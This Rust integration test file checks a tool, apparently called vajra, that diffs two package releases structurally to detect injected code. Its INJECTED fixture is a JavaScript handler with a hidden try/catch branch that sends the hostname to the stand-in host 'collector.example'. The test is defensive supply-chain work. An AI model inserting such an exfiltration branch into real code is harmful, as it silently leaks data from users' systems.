//! Integration tests for `vajra drift --tree`.
//!
//! Comparing two releases of the same artifact is a different question from
//! comparing two documents: what matters is the *change*, since a compromised
//! established package presents perfectly at any single point in time.

use std::io::Write;
use std::path::Path;
use std::process::Command;

use anyhow::{anyhow, Context, Result};
use tempfile::TempDir;

fn vajra_bin() -> std::path::PathBuf {
    let mut p = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    p.pop();
    p.push("target");
    p.push("debug");
    p.push("vajra");
    p
}

fn as_str(path: &Path) -> Result<&str> {
    path.to_str()
        .ok_or_else(|| anyhow!("path is not valid UTF-8: {}", path.display()))
}

fn write(root: &Path, rel: &str, body: &str) -> Result<()> {
    let path = root.join(rel);
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let mut f = std::fs::File::create(&path)?;
    f.write_all(body.as_bytes())?;
    f.flush()?;
    Ok(())
}

fn tree_diff(a: &Path, b: &Path, extra: &[&str]) -> Result<serde_json::Value> {
    let mut cmd = Command::new(vajra_bin());
    cmd.arg("drift")
        .arg(as_str(a)?)
        .arg(as_str(b)?)
        .arg("--tree")
        .args(["--format", "json", "--quiet"]);
    cmd.args(extra);
    let out = cmd.output().context("failed to run vajra drift --tree")?;
    assert!(
        out.status.success(),
        "tree diff failed: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    serde_json::from_slice(&out.stdout).context("tree diff did not emit valid JSON")
}

const CLEAN: &str = r"
function handler(req, res) {
  const payload = { ok: true, id: req.id };
  if (!req.id) { return res.status(400).end(); }
  return res.json(payload);
}
module.exports = handler;
";

/// Same shape, different string values and identifier names.
const RENAMED: &str = r"
function process(request, response) {
  const body = { ok: true, id: request.id };
  if (!request.id) { return response.status(400).end(); }
  return response.json(body);
}
module.exports = process;
";

/// The clean module plus an injected exfiltration branch.
const INJECTED: &str = r"
const os = require('os');
const http = require('http');
function handler(req, res) {
  const payload = { ok: true, id: req.id };
  try {
    http.request({ host: 'collector.example', path: '/' + os.hostname() }).end();
  } catch (e) { }
  if (!req.id) { return res.status(400).end(); }
  return res.json(payload);
}
module.exports = handler;
";

#[test]
fn identical_releases_report_no_changes() -> Result<()> {
    let a = TempDir::new()?;
    let b = TempDir::new()?;
    for root in [a.path(), b.path()] {
        write(root, "package/index.js", CLEAN)?;
    }
    let d = tree_diff(
        a.path(),
        b.path(),
        &["--input-format", "source", "--lang", "javascript"],
    )?;
    assert_eq!(d["summary"]["unchanged"], 1);
    assert_eq!(d["summary"]["changed"], 0);
    assert_eq!(d["total_node_delta"], 0);
    assert_eq!(d["files"].as_array().map(Vec::len), Some(0));
    Ok(())
}

/// Renaming and reformatting must not register — otherwise every release would
/// look like a rewrite and the signal would be useless.
#[test]
fn renaming_is_not_a_structural_change() -> Result<()> {
    let a = TempDir::new()?;
    let b = TempDir::new()?;
    write(a.path(), "package/index.js", CLEAN)?;
    write(b.path(), "package/index.js", RENAMED)?;
    let d = tree_diff(
        a.path(),
        b.path(),
        &["--input-format", "source", "--lang", "javascript"],
    )?;
    assert_eq!(
        d["summary"]["unchanged"], 1,
        "identifier renaming is not structural"
    );
    Ok(())
}

/// The case this exists for: an injected payload in an otherwise stable release.
#[test]
fn injected_payload_is_detected() -> Result<()> {
    let a = TempDir::new()?;
    let b = TempDir::new()?;
    write(a.path(), "package/index.js", CLEAN)?;
    write(a.path(), "package/util.js", CLEAN)?;
    write(b.path(), "package/index.js", INJECTED)?;
    write(b.path(), "package/util.js", CLEAN)?;

    let d = tree_diff(
        a.path(),
        b.path(),
        &["--input-format", "source", "--lang", "javascript"],
    )?;
    assert_eq!(d["summary"]["changed"], 1, "only the injected file changed");
    assert_eq!(d["summary"]["unchanged"], 1);

    let files = d["files"].as_array().ok_or_else(|| anyhow!("no files"))?;
    let changed = files
        .iter()
        .find(|f| f["change"] == "changed")
        .ok_or_else(|| anyhow!("no changed entry"))?;
    assert!(changed["path"]
        .as_str()
        .is_some_and(|p| p.ends_with("index.js")));
    assert!(
        changed["node_delta"].as_i64().is_some_and(|d| d > 0),
        "an injected payload grows the tree, got {:?}",
        changed["node_delta"]
    );
    assert!(d["total_node_delta"].as_i64().is_some_and(|d| d > 0));
    Ok(())
}

/// Files are matched on their path relative to each root, so the differently
/// named extraction directories of two tarballs still line up.
#[test]
fn differently_named_roots_still_align() -> Result<()> {
    let a = TempDir::new()?;
    let b = TempDir::new()?;
    write(a.path(), "package/lib/x.js", CLEAN)?;
    write(b.path(), "package/lib/x.js", CLEAN)?;
    let d = tree_diff(
        a.path(),
        b.path(),
        &["--input-format", "source", "--lang", "javascript"],
    )?;
    assert_eq!(d["summary"]["unchanged"], 1);
    assert_eq!(d["summary"]["added"], 0);
    assert_eq!(d["summary"]["removed"], 0);
    Ok(())
}

#[test]
fn added_and_removed_files_are_reported() -> Result<()> {
    let a = TempDir::new()?;
    let b = TempDir::new()?;
    write(a.path(), "package/gone.js", CLEAN)?;
    write(b.path(), "package/new.js", CLEAN)?;
    let d = tree_diff(
        a.path(),
        b.path(),
        &["--input-format", "source", "--lang", "javascript"],
    )?;
    assert_eq!(d["summary"]["added"], 1);
    assert_eq!(d["summary"]["removed"], 1);

    // Added first, then removed — fully specified ordering.
    let kinds: Vec<&str> = d["files"]
        .as_array()
        .ok_or_else(|| anyhow!("no files"))?
        .iter()
        .filter_map(|f| f["change"].as_str())
        .collect();
    assert_eq!(kinds, vec!["added", "removed"]);
    Ok(())
}

#[test]
fn json_trees_work_without_source_format() -> Result<()> {
    let a = TempDir::new()?;
    let b = TempDir::new()?;
    write(a.path(), "d/one.json", r#"{"a":1}"#)?;
    write(
        b.path(),
        "d/one.json",
        r#"{"a":1,"injected":{"deep":true}}"#,
    )?;
    let d = tree_diff(a.path(), b.path(), &[])?;
    assert_eq!(d["summary"]["changed"], 1);
    Ok(())
}

#[test]
fn requires_two_directories() -> Result<()> {
    let a = TempDir::new()?;
    write(a.path(), "x.json", "{}")?;
    let out = Command::new(vajra_bin())
        .arg("drift")
        .arg(as_str(a.path())?)
        .arg("--tree")
        .output()?;
    assert!(!out.status.success(), "one argument is not enough");
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(stderr.contains("two directories"), "got: {stderr}");
    Ok(())
}

#[test]
fn text_output_states_the_comparison_basis() -> Result<()> {
    let a = TempDir::new()?;
    let b = TempDir::new()?;
    write(a.path(), "package/index.js", CLEAN)?;
    write(b.path(), "package/index.js", INJECTED)?;
    let out = Command::new(vajra_bin())
        .arg("drift")
        .arg(as_str(a.path())?)
        .arg(as_str(b.path())?)
        .arg("--tree")
        .args(["--input-format", "source", "--lang", "javascript"])
        .arg("--quiet")
        .output()?;
    assert!(out.status.success());
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(stdout.contains("Structural Tree Diff"), "{stdout}");
    assert!(stdout.contains("Net node delta"), "{stdout}");
    assert!(
        stdout.contains("structural shape"),
        "must state what is compared:\n{stdout}"
    );
    Ok(())
}

#[test]
fn is_deterministic() -> Result<()> {
    let a = TempDir::new()?;
    let b = TempDir::new()?;
    for i in 0..6 {
        write(a.path(), &format!("package/f{i}.js"), CLEAN)?;
        write(b.path(), &format!("package/f{i}.js"), INJECTED)?;
    }
    let args = ["--input-format", "source", "--lang", "javascript"];
    let one = tree_diff(a.path(), b.path(), &args)?;
    let two = tree_diff(a.path(), b.path(), &args)?;
    assert_eq!(serde_json::to_string(&one)?, serde_json::to_string(&two)?);
    Ok(())
}
